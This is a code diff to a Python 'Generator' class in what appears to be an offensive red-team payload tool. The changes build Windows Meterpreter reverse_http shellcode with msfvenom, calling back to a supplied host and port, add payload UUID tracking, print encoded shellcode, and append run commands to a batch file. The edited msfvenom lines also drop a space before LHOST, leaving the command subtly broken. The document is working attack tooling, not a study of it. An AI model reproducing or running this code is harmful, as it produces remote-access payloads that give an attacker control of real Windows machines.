@@ -7,7 +7,7 @@ import base64
 class Generator():
 
 
-	def genShellcode(self, host, port, arch, shellProcess = None):
+	def genShellcode(self, host, port, arch, name, shellProcess = None):
 		#TODO fix to use string .format, remove the filewrite
 		code = ''
 		form = 'c'
@@ -22,9 +22,9 @@ class Generator():
 			form = "psh"
 		
 		if (arch  == "x86"):
-			os.system("msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_http LHOST="+host+" LPORT="+port+" -f "+form+" > /tmp/metasploit 2> /dev/null")
+			os.system("msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_http PayloadUUIDTracking=true PayloadUUIDName=" + name +"LHOST="+host+" LPORT="+port+" -f "+form+" > /tmp/metasploit 2> /dev/null")
 		else:
-			os.system("msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_http LHOST="+host+" LPORT="+port+" -f "+form+" > /tmp/metasploit 2> /dev/null")
+			os.system("msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_http PayloadUUIDTracking=true PayloadUUIDName=" + name + "LHOST="+host+" LPORT="+port+" -f "+form+" > /tmp/metasploit 2> /dev/null")
 
 		with open("/tmp/metasploit", 'rb') as f:
 			code = f.read()
@@ -47,6 +47,7 @@ class Generator():
 			shellcode = self.hexEncode(shellcode)
 		elif shellProcess == 'decEncode':
 			shellcode = self.decEncode(shellcode)
+			print(shellcode)
 		elif shellProcess == 'b64Encode':
 			shellcode = self.b64Encode(shellcode)
 		elif shellProcess == 'pshEncode':
@@ -98,3 +99,8 @@ class Generator():
 		shellcode = shellcode.decode('utf-8')
 
 		return shellcode
+
+	def genRunScript(self, run_info):
+		with open('./GenerateAll/run.bat', 'a') as f:
+			f.write(run_info + '\n')
+			f.write('timeout 30 > NUL\n')
